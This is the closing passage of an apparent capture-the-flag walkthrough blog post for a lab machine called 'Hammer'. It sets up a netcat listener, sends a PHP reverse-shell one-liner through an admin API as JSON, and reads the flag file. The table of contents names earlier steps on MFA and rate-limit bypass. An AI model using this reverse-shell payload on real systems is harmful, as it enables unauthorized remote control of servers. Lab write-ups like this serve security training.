<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">9999</span>
</span></span></code></pre></div><p>We know the server is running PHP.
So we can use the following command via the HTTP POST requests because we can now send commands as admin.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;command&#34;</span>:
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php -r &#39;$sock=fsockopen(\&#34;10.6.68.14\&#34;,9999);exec(\&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;</span>}
</span></span></code></pre></div><hr>
<p><em><strong>Note</strong></em>: When sending commands like this through an API interface, make sure to escape the double quotes<code>&quot;&quot;</code>, as JSON uses double quotes to define keys and values. Wrongly formatted commands will produce errors.</p>
<hr>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-27.png" alt="Image"></p>
<p><img src="https://phantomindamachine.github.io/CTF-Blogs/images/Hammer-29.png" alt="Image"></p>
<p>As we can see, we get the reverse shell.
We then navigate to <code>/home/ubuntu/</code> and <code>cat</code> the file <code>flag.txt</code>.</p>

  
  <hr>
<div class="footer">
    
	    
	    
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#add-target-ip-to-etchosts-file">Add target IP to <code>/etc/hosts</code> file</a></li>
    <li><a href="#1-reconnaissance">1. Reconnaissance</a>
      <ul>
        <li><a href="#start-off-simple">Start off simple:</a></li>
        <li><a href="#scan-a-larger-range">Scan a larger range.</a></li>
        <li><a href="#rescan">Rescan</a></li>
        <li><a href="#recap-nmap-scans">Recap nmap scans</a></li>
      </ul>
    </li>
    <li><a href="#2-the-website">2. The Website</a>
      <ul>
        <li><a href="#brute-force-protections">Brute-Force Protections</a></li>
        <li><a href="#checking-http-responses">Checking HTTP Responses</a></li>
      </ul>
    </li>
    <li><a href="#3-bypassing-multi-factor-authentication--rate-limit-countermeasures">3. Bypassing Multi-Factor Authentication &amp; Rate-Limit Countermeasures</a>
      <ul>
        <li></li>
        <li><a href="#remote-code-execution">Remote Code Execution</a></li>
        <li><a href="#getting-a-shell">Getting a Shell</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
